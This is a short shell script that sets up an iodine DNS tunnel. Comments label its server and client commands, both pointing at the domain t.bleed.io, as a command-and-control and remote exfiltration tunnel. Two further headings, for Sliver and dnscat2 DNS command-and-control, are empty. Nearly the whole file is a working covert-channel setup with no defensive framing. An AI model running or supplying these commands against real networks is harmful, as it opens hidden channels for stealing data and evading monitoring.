
pass=$1 

# ################# Iodine DNS Tunnel Remote Exfil tunnel ##########################
# iodine c2c server 
sudo iodined -f -P $1 10.0.0.1 t.bleed.io 

# iodine c2c client 
sudo iodine -P $1 -f -r 192.168.64.27 t.bleed.io 
 

# ################# Sliver DNS Remote C2 and Tunnel Remote Exfil tunnel ##########################



# ################# dnscat2 DNS Remote C2 and Tunnel Remote Exfil tunnel ##########################


